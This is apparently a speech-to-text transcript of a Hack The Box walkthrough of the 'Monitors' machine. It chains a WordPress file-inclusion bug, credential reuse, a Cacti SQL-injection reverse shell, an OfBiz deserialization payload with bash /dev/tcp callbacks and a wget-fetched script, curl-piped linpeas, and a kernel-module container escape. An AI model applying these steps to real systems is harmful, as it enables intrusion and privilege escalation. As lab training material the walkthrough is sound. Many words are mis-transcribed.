 what's going on youtube this is ipsec i'm doing monitors from hack the box which was a really fun box that involved pivoting around a bunch of web applications and then ultimately you end up in a docking container running as root that has the capsis module uh capability so what you can do with that is compile and run a local kernel module so you get code execution on the host operating system as root but before you get into that document container you got to put around the three web applications it is wordpress cacti and then apache of biz which is just a standard desearization vulnerability my favorite part was actually the wordpress vulnerability because it's a lfi that does not involve code execution so you can get really creative with the information you extract out of that lfi in this video we'll extract a bunch of processes by enumerating the slash proc directory and then the apache configuration to get the hidden virtual host of cacti that you use to um get a shell on the box with all that being said let's just jump in as always we can begin with and map so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it monitors and then the ip address of 10 10 10 238 this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and this banner tells us it's an ubuntu server and then we also have http on port 80 and its banner tells us it is apache and running version 2429 which i don't believe is vulnerable to the latest exploit because if we go over to google and google like apache rce it's probably gonna come up because it's like the largest vulnerability in apache and so long but let's see that's 2020 uh here's the two days ago two four four nine so about 20 versions off and then the one thing a lot of people may be thinking is well we can just get like the release date of this apache and see exactly when it was released however um ubuntu does like multiple versions of this apache so they like i guess essentially fork this version have their own updates so if we go to like apache uh this is i think bionic based upon that ssh version uh two four two nine we can go to the packages and that's not what i wanted i wanted to go to pad let's see how do we get here apache 2 that's not it i probably could have clicked on that one let's see so we can see um it's 24291 ubuntu 4.18 now we can just decrement that 1 8. this one ubuntu 4 i think is related to the distro and then this is the versions so since it's not giving the specific version header we don't know exactly when apache was released because it's hiding this descriptive one i know i said that twice i guess but can't really get exactly when apache was released just wanted to go into all that and i guess we can take a look at the website now so 10 10 10 238 i don't want to go to google and it says sorry direct ip access is not allowed if you're having issues contact the website administrator at admin at monitors.htb so let's go and add this to a host file so sudo vi etsy hosts and we can say 10 10 10 238 and monitors.htb refresh the page well we now have to go to monitors.htv and there we go we have a website so the very first thing that sticks out to me is this 2018 copyright whenever i see an old copyright i'm thinking maybe this can be on search boyd or something the other thing that sticks out to me is this powered by wordpress so we can confirm it is wordpress by just going to like slash wp-admin and we get a login so we know yep this is wordpress so let's take it over to wpscan and the options i really like doing um i like setting the plug-in detection mode to aggressive because if it's in like passive mode which is the default it's just going to get to the pages and then examine the source code and look for the actual plugins if you have it in aggressive mode it's actually going to try to hit each plugin in like the i think slash wp content slash plugins maybe yeah oh we got a plugin right here off just guessing wp with spritz so we may not even have to um go into using um wp scan because we know the plugin now the other thing i like doing is using the dash e to enumerate all plugins so i'm just going to do wp scan dash u for url http uh monitors.htb dash e ap and dash dash was it plugins detection was that was it what it was detection yep and we can say aggressive so that's going to oh is it dash url i hate when they make like weird arguments i don't run wp scan all that much dash dash url there we go that one is on me is it plug-in detection do i mean dash dash plug-ins let's see p p-l-u-g-i-n-s u g i n s dash d there we go sometimes typers are hard to find so now we're just running the wp scan but we can look at this wp with spritz and if i look at readme we can see let's see what version is this requires at least 3.8 so this is talking about the wordpress version i don't see oh changelog here we go 1.0 so we can probably just go to search boy so search point and i'm going to search for is it spritz s-p-r-i-t-z let's see what happens here and we do have a remote file inclusion so we can do search point x and if you're wondering um this folder should never be opened like to everyone you should put index.html in here so you can't enumerate plugins like i just did but that's besides the point let's go take a look at this and we can see the lfi so it looks like we just access this url and then pass it a file easy enough we'll do it at c passwd so copy this we can paste i want to send this one to burp suite because i like using the repeater tab intercept is on and we have lfi so let's look at the users we have marcus oh god i did not mean to click that one let's see exit burp no wrong burp oh god oh god yeah i don't have a license anymore exit there we go that was a series of unfortunate events but we are back delete close next start cancel proxy's on refresh oh repeater there we go okay so users my sequel uh be careful there marcus and then these are all the default users so there's not much we can do there let's see what else can we look at we can probably get the wordpress config so i'm just going to um do dot slash index.php is this where it is let's try another one oh this is doing slash start there we go so this would be getting out of the plugins this is getting out of wp content and we can see we have the index and the other thing this is telling us is since we see this php tag it is a um just like file disclosure we can't execute code here we'll probably add a file get contents i bet if we look at the search point it may tell us uh it does not oh here yeah source code so we're in a file git contents so no path to rce if this was a windows server we could path pass a unc path here and try to get like a hash or do um ntlm forwarding attacks but since this is a linux we can't really do any of that so we have to just rely on the files so i'm going to try wp-config.php uh let's see where is the wordpress config i thought it was wp-config let's just go to github wordpress take it off of burp suite and we'll see where wp dash configures ah should be in the home let's see okay maybe i have to go up three directories is index.php like this too okay so there's index.php and uh the root and then also wp content does have one which just says silence is golden okay so we have found that and let's see we only get a portion of this source code this is weird oh nope i'm in index wp config there we go that's what i was expecting to see and we have a user so best administrator 2020 bang so let's go take a look at monitors so monitors.htb let's see the blog post is by admin so we know this is the user so let's try going to slash wp admin and logging in with admin and the password uh access denied so let's go back here and a wp scan is still running the downside with enumerating all plugins it can take like 15 minutes so i'm just killing that since we don't need any more um i'm going to do h because there is a enumerate users right let's see username list that's for like brute forcing exclude username here we go dash e so dash e we can do u and we'll enumerate user ranges um if no argument specified it's going to enumerate user id 1 to 10. so we could do dash u 1 to 100 or enumerate 100 user ids but we're just going to specify the default real quick so let's go back here dash e u and let's see exactly what this enumerates do we get usernames now wordpress there we go uh found one user admin so we don't really have anything here so let's go back into the lfi so other files we can get on the web server uh let's see let's go to github lfi python exploit maybe this will have something lfi suite and we can look at its word list uh path to test and it's doing a lot of like prox selfs so if we wanted to we could actually like um actually not proc self but we could enumerate the running processes on the box so if we wanted to let's see let's go dot slash um ls slash proc so let's see if we do see ls proc self each of these like numbers is a pid on the system so i think it's proc self uh let's see cmd line is there environ is there a cmd line yeah there is so if i cap this it's going to get the cmd line of the actual program but let's do proc uh self cmd line and we actually don't get anything one cmd line let's see environ ls proc self let's see let's try maps can we get any file in here it's not looking like i can get any file out of this proc table okay i just wasn't doing enough dot dot slashes so if we do cmd line there we go so what we could do is write a script and brute force this so if i'm going to pass this to curl so curl monitors.htb like that and that's going to save to binary so if we do dash dash output dash now it's writing to stand it out so we could quickly write a script so for i n sec 0 to let's do 9001 uh let's just do 2 000 go quicker do and we can say echo dash n i colon because this is going to tell us what pid it is if we ever wanted to look more into it and then we can say curl and do this done and we probably need to put another echo here because we're not um playing a line break after the output and the last thing this needs to be dollar i so now we are enumerating all the processes on the box um we can do t pid.list so while that's running that's going to be a noisy f pid.list there we go see if that works eventually but that's how we could enumerate running processes the other thing we can try to get is like apaches config so we can do um etsy apache two and this is ubuntu so it's probably um sites dash available dash is it zero zero zero dash default dot conf is that the default yep it is so this is where ubuntu stores the apache configs if it was like red hat i'm guessing it's stored a little bit differently but that's where knowing the actual um thing helps and we can see default virtual host settings add monitors.htb.conf and cactiadmin.monitors.htb.com so we have two virtual hosts here and we only know one we know monitors.hdb.com and i bet if we do like this and do monitors hdb.com we get the host so this is inverweb wordpress and if we go to the other one cacti admin i'm just going to do it in different pane but here what do we have this one is going into user share cacti and the other way we probably could have found this now that i'm thinking about it is since then user share this is being installed via package manager and i think by default the package manager log is readable uh let's see verilog is it grepped apt uh d package yeah dpkg.log so let's try looking at that real quick verologdp kg.log dot one there we go and we can see all the packages running on the system are being installed so this is something else we could look at uh we probably have to go like 2 dot gz do we have files here blue.gz maybe not see status half i don't see cacti in here so maybe this wouldn't be a good way to look for it but you can see definitely packages there see 2.gz one of these files got deleted or rolled off but just something else to look at on boxes but we should probably should look at this cacti monitor so let's do v etsy host make sure you run that with sudo and we can paste cacti admin.monitors.htb and we can go to it here let's see login bam uh oh i have conf we just want hdb so edit this again and it's log into cacti so we have to get users so we can like google default cacti credentials and see what these are default user and password not working let's see does it tell me what they're trying it's waiting on the forms uh character installed admin admin so let's try admin admin and we get nothing cacti is telling us the version one two one two uh 1.2.12 that's funny but if i remember correctly we had a credential and wordpress so let's try the wp config dot php and you should always save the passwords when you come across them because you never know when there's gonna be a good case of password reuse so we can just do best administrator at 2020 bang log in and we get logged into cat guy a cacti i think that's what it's called and out of curiosity i just want to see let's see yep we are getting processes running so if we wanted to also we can do a grep v and what we're saying is colon line break and pid.list and we probably want to specify dash a and here we go now we're getting a list of all the processes on the system we can see like lx cfs is running but sometimes this does help enumerate um various things that are running so let us look at cacti let's see if we can get a change log on this version so version one two one two cacti that and just googling it we get the release may 3rd 2020 but we also have a sql injection so we can take a look at this we can see it's already configured so we can use a proxy if we want we just uncomment that and uncomment this and see how it works it is a login and here's the exploit so it's going to use this reverse shell as doing a union injection and then actually is that a semicolon sometimes they can't tell with fonts yeah that is so this is a weird i guess a stacked sql injection i forget exactly what it's called i haven't really seen these in a long time but what it does is we have one sql statement and that does the semicolon and then does a second sql statement and it's doing update settings set value reverse shell where name is path to php binary and then after that it's going to execute this host.php actionary index so apparently i guess what this does is there's a config setting that says where php is set and it's overwriting that so the next time the application tries to use php or actually called php as a binary it's going to now call a reverse shell instead and get us a shell so let's take a look at this let's try just copying it and we'll run it so we can do vi i'll call it cacti dot pi set paste paste it that's not it there we go if you ever wonder whenever i paste something delete and then redo it the first time doing a shift insert to paste and then ctrl shift insert to paste there's two different clipboards and i always seem to get it wrong every time it's just like there's two ways to plug in a regular usb but for some reason you always get it wrong the first time so let's do t for url and we can just go what is it here it is and then dash u admin dash p the user password that is best administrator 2020 and since this has special characters in it i'm putting it in single quotes so the command line does not parse it uh l host is going to be 10 10 14 8 l port 9001 we can just get rid of that we've already proven we can dump processes run this exploit we try to log in and we do get a shell so python3 dash c import pty pty dot spawn then bash control z stdy raw minus echo fg enter enter and now i want to clear the screen so export term is equal to x term there we go so now we're on www dash data on this box the first place i always like going is databases so let's go and go into verb dub dub wordpress and we want to get into the wordpress database and see if there's any other databases we have access to mainly to see other users on the box so let's do cat wp dash config.php [Music] and let's search for password let's see this is the database password so best administrator 2020 bang and we can do my sequel dash u wp admin dash p put in the password and we can say show um databases and there's only two wordpress and information schema we can say use wordpress and then what is it select star from wp underscore users and people are telling me like backslash g i don't know slash g let's see there's a pretty way to do selects and i'm not exactly sure how should go back to the last video i did on like sql commands and look at comments um let's see mysql pretty print large pretty print lots of columns see best way mysql select backslash capital g in place of the semicolon slash g huh so doing that actually puts it on um like vertical print so if i just do like the select star with the semicolon it puts it everything on one line backslash g without the semicolon puts each item on its own entry so we could try cracking this password but that's not actually going to do me anything i have the power of hindsight so i'm not going to waste time doing it what i mean by power of hindsight is i've already solved this box but i'm just kind of like showing the steps i would still take if i was doing this blindly the easy boxes i generally don't um do the box ahead of time but this is medium i'm looking at settings just to see if there's any password uh i'm just gonna grab dash i password on dot and i don't think i get anything now we need dash ri and oh man that is a lot let's see i'm going to say cacti change my sequel password so whenever i like have issues with something i don't really like google how to do it maliciously instead i um look at how to like how an administrator would do it because that's how you get to the help docs so i don't see that in the file let's see cacti update database password password recovery where is it in the php file to reset admin login your linux server let's see my sql client saying the root password that's not what i want uh gup dash ri mysql period grab eye config see i see it right here include config.php so v include cool cat include config.php let's see is there anything here we can grab dash v let's see starting with pound oh this is gonna get messy yeah not too bad uh cacti and cacti pass so let's see can i show that command i'm gonna have to update my stty so we can do stty let's see this is going to be rows probably 24 and columns 105. so this is what i had done i did a grep v and then backslash pipe this is ore so i'm excluding anything that starts with a um ampers or pound sign or whatever that is and then i'm doing an or and saying anything that has a start in it since that was also used for comments and then grab period um show me lines that are not blank so we now have cacti and cacti pass so we could look at users here so mysql dash u um yeah uh cacti dash p show databases and now we can see we have the cacti database actually enough we have that mysql database i wonder if this is a sql admin user show tables and let's see is it user auth describe user auth select star from user auth slash g and we do have a guest user and administrator user so this is another account that we could attempt to crack but the actual way is if we look at home and go into marcus there is a note.text and there's also this backup file and we can't read note.text or user.txt and all these steps are not needed because if you do a netstat we can see port 8443 is listening so you can always upload chisel and access this port which is the next step of the box so getting marcus's password is not needed but i still want to show it so if we try to go into backup we can't however we do have um the execute bit so we can go into the directory we just can't list the contents so if we knew a file that was in dot backup we'd be able to access it so what i'm going to do is grab our i dot backup on slash home and we don't have anything we could also do to devnull we're just gonna hide anything that um any error message we're gonna do it on slash etsy as well and we'll probably want to put a maybe a backslash here because i'm thinking this is matching a wildcard and we can see there is a um jsonpatch.bat this is i guess python maybe but um alternatively there is this cacti backup.service and the exact start is leaking backup.sh if we look at this service so let's cap the service we can see it's a cacti backup service type one shot so it's just gonna run once users dub dub dub data and here is the backup script i'm guessing if we ran like lynn p's we would show it but i just want to show other ways to get data that you want that's just not running an automated script because a lot of times when you do like an exam or something they'd make they do their best to make sure it's not just on some automated script so you have to do some recon yourself so that's why i like showing this like unique approach to finding dot backup instead of just doing what we all do already so there is this so i'm going to cap the file and we get another credential we have the backup name as cacti backup and the password of vertical edge 2020. it is doing ssh pass to copy the backup somewhere but other than that we don't really know too much so let's do um cat etsy pass wd i'm going to grab for ending in sh because sometimes it's been sh or been dash or been zsh or ben bash there's a lot of ways like different um terminals people may be in but they generally end in sh so this is just a good way to get interactive users su-marcus paste the password in i did not have the correct password paste the password in and we get ssh as him and we can look at note.text which is just saying update docker image for production use so if i do groups i'm not a member of docker so i can't do like docker ps if i do a ps ef grep for docker we can see it and this is let's see port uh pid1543 i'm just curious if my lfi got it so let's do grep 1543 pid.list dash a and we can see from our lfi we knew daca was running so that could have been other files we tried to pull so okay uh we have something here uh that doesn't look interesting host ip so this docker is going into eight four four three so we should try to exploit the stock container i guess um i'm going to let's see is it total ac i forget how to do the ssh oh i'm not ssh10 this is a netcat session let's see shift insert control shift insert let's get his password again uh vertical edge i think it was vertical edge 20 20. so we're going to do ssh marcus at 10 10 10 238 paste the password and then i'm going to if you do like um squiggly c on the first thing drops you into this ssh prompt and i can just put the 8443 12701 8443 so now if i go to localhost 8443 it wants tls so we can do https and what that did was set up a ssh tunnel that listens on eight four four three of my box goes through this ssh session and hits one twenty seven zero zero one eight four four three and you don't have to do it through that like command prompt i could have just done it as a argument so like this and if we wanted to uh prove it we can do like 9443 vertical edge 2020. did i type it right i did so now if i hit localized 8443 it doesn't exist because i changed it to 9443 so let's look at the error message and this is just a 404 and it's running apache tomcat so the first thing i try to do is go to slash admin to see if i can access the tomcat manager we can also try comcat but i don't think that does anything um so i'm going to run a go buster on this so let's do go buster dash u https 127.001 port 9443-w opt set list um discovery web content and then raft small words dot text and i think dash k so we ignore ssl uh oh we just put it in door mode there we go and while this runs let's google apache tomcat 9031 to get when this was released so here we go 9031 2020 february 5th so this box was probably released in 2021 somewhere so there could be some tomcat vulnerability search blight tomcat 904 was it what was the version 903 9.0 let's see one so i don't see any 903s we do have a few pages so we have catalog content common so let's try these catalog and notice i did skip over images because generally i'm not too interested over images content and we get of biz on both of these so catalog control main content control main they're both pretty much the same and let's see we have admin so let's see of biz default credentials we don't have any user names for this admin of biz so we can try admin of biz nothing vertical edge 2020 and we can go back to wordpress with the best administrator and we don't get anything we need to find a way to enumerate usernames potentially of this so if i just do admin uh get password hint let's do admin asd and still the same thing so i don't think we can enumerate um users since it's behaving the same way i'm going to do search point of biz and we can see there are vulnerabilities to it so we have admin creator remote code execution via sql injection let's see do we have a version 17201 and this is 17 12. let's see is there a way to update search blight let's do exploit db because i don't feel like running an apt update maybe it's just been too long so i've updated it maybe we're missing things and here it is this apache 1201 and we can see exactly how this works um i'm just going to copy it and we'll put it into our terminal so ofbiz.pi set paste i'm doing this just because um i like syntax highlighting so we have port we probably want to change that attacker's ip import creating a shell i really don't know if i like this exploit so main reason i said i don't like it because it's just gonna do everything that i like showing automatically so it's going to download yso serial that's going to create a payload that's going to upload it and then create a second payload to execute it and then execute the payload and then delete file and remove the shell uh i guess we can if we have trouble we can run this but i want to go and see if we can find a uh exploit real quick apache of biz copy this paste it here let's see github is this going to [Music] create liner htp still don't know if i exactly like that let's try this no see you can cheat and go to the one i know i want or not let's see github.com typo wannabilityhub and then we want to look for of biz here we go so this is a pretty cool um repository that just has a bunch of vulnerabilities if you want to do some research but these are the instructions i kind of wanted so we want to get weiser serial first so let's grab this and we can go to releases 005. and w get this so let's see tar is the xvf005 [Music] we can go into wiser serial oh this is the source i don't want the source 10 releases i remember there was some way proof of concept no remember there was some way to download okay ladies from jetpack that's what i want copy link w get because no one has time to compile java code let's see dot slash y c java dash jar y serial dash master sweet so now we have this we can do last capital that error i was having to put this all on one line so we can easily read it but oh well so let's see we want to generate the payload and it is dash master snapshot there we go so it's using the common beans utils framework here's the payload i'm going to actually try let's see i'm gonna try the i don't think bash is gonna work bash dash c bash dash i and then we can do let's see it's a lot of special characters going in here dev tcp 10 10 14 8 9001 may want to do it the same way the exploit did and just um what is it have two scripts one to download one to um execute we can try doing it in one no harm in trying first so what i was doing here is to make sure nothing got parsed to make sure our payload looks fine it does nclvmp 9001 we can say xclip dash selection primary okay so the next thing we want to do is send the post request so i'm going to turn burp suite on where we we don't need to we can just open a new tab target this would be localhost 9443 use https and then we copy this go back here put it on clipboard and it wants us to replace base64 payload with the actual payload let's see that selection clipboard let's try it with that syntax paste okay send uh failed to read request and we don't have a shell so let's set up a web server and create a file into the wget method so make dirt dub dub dub v shell dot sh dash dash c dash dash i devtcp 1010 14 8 0 at end one like that okay and we can say python3 dash ab http.server so what this is going to do is actually two things number one it's going to validate that our um rce works because we'll see it hitting a web server and number two there's a lot of less bad characters so 10 10 14 8 8 000 shell.sh dasho tap shell.sh with doing it the um other way with just a straight reverse shell we don't know exactly where it's erroring so that makes it really tough to troubleshoot paste this in fail to read but we did get a hit so even though it errors we do get an access request which is good so now we can instead of downloading we can just execute so bash temp shell.sh and paste this one in does not look like we got it so this is probably a fault of a bad reverse shell because we know that file gets created but we can't execute it we can just try executing www.rsh and of course forgot to put the port always test your code so that works okay i'm going to copy this entire thing we'll click back once send should download paste the new one and we get over a shell so whatever shell works if you just type it correctly um now we're in a docker container let's see if we can do python 3 import pty pty dot spawn then bash uh which python we probably don't have python oh we do python dash c import pty pty spawn bend bash sd do i raw minus echo fg export term is equal to x term there we go so now we're a root in this dock container the first thing i want to do is maybe grab the shadow to see if there's any password here that we could reuse and this is kind of weird um we were low priv user on the host which is generally viewed as higher privileges than a docker container so why did we just like drop privileges because we get a shot in the box and now we're getting farther away from getting root on the box uh we are root on the stock container though which is nice because there are a few ways to go from dock container back to the host operating system the first one is just like mounting the disk if i forget exactly what privilege it is but if you look in dev and see like sda or something like that that references a hard drive um chances are you can do that looking at dev here we don't really have anything the other thing is you can do cap sh print to look at the docker capabilities now this is a lot to parse through um i think this capsis module is the one that we want to abuse but if you don't want to do that or don't want to look through it we can copy up privileges uh privilege escalation script awesome suite lynn pease limpese.sh2 dub dub dub and probably just curl it so curl um 10 10 14 8 port eight thousand linps.sh pipe it over to bash and we can see what lin piece has to say about it because it does check docker capabilities once it discovers it is in docker if we didn't want to use lin p's there is deep c d e e p s e i think or c e d c github this is a another docker enumeration script let's see do we have it yet docker let's see am i darker version here we go so container capabilities so we have cap dac override uh sys module dac override and sys module again so it did highlight the ones we should be googling so if we google capsis module we can see exactly what it does load and unload kernel module so we can load and unload a coder module which docker is a like shared kernel between the host and the containers it's not a full virtualization i forget what it is um i think it goes down to like virtualization levels but since we're sharing the kernel if we load a malicious kernel module then we get code execution on the root so what i'm going to look for is a kernel module example so kernel module reverse shell if we google this how to add reverse shell to host from privileged container maybe uh reverse shell access kernel module so if we look at shells we may have to upload everything here which i don't exactly want to do deep sea where am i this looks promising and we have a table of contents to the right so we can kind of look at it as doing a capabilities check and it looks like the lib cap package is needed for this cap sh so if it doesn't have it uh you can do apk add if this is a alpine container it uses apk i believe talks about all the privileges that probably can be abused uh cis module p trace this is like a debugging thing i forget what cis admin is i want to say it allows the disk to be mountable but we have the kernel module here so let's call this v reverse shell dot c [Music] set paste paste it in and then we want to change this ip address so this will be 10 10 14 8 and this will be 9001 okay so it calls ben bash dash c and then does the command so that's why we don't have to do the bash c before here because it's already doing it right here setting the environment so this looks like the path uh we if we have an error i may try like slash bin slash bash because i'm not sure it's setting the path correctly so here's the function initialization connect back and it's called user mode helper so i think this i don't know exactly but i think that's what lets us execute commands in the user mode because uh if like the kernel and users have different sets of syscalls exposed to them so this yeah it allows us to start a user mode application to say it's not in the kernel so we can set the execution path org v0 which is going to be bin bash then the arguments it's going to pass everything so it's going to send this whole thing and then the environment which is just going to be home and we're not waiting for the program to return or are we oh no we're not the comment says we're not so upon initializing the kernel module we do connect back and execute this function upon exiting we just exit which just prints exiting so exit does nothing we can save that and then we want to go and grab the make file so let's copy this v make file and the makefile is case sensitive so make sure you do a capital m going to say make and [Music] something aired out oh the name so it's as a very shell underscore module i just called it reverse reverse dash shell so now we can make and then we have this reverse shell.ko which is the kernel module so all we do is ins mod to insert it and nclvnp 9001 actually i think i'm listening here so insert the module we can remove it if it exists already and then insert the module so auramod removes the module ins mod inserts a module and we can see we are root at monitors and now i am not in a docker container if i do ipaddr we can see all the docker interfaces also if i do ls la on slash we don't have that dot docker m file so yeah that is gonna be the box hope you guys enjoyed it take care and i will see you all next week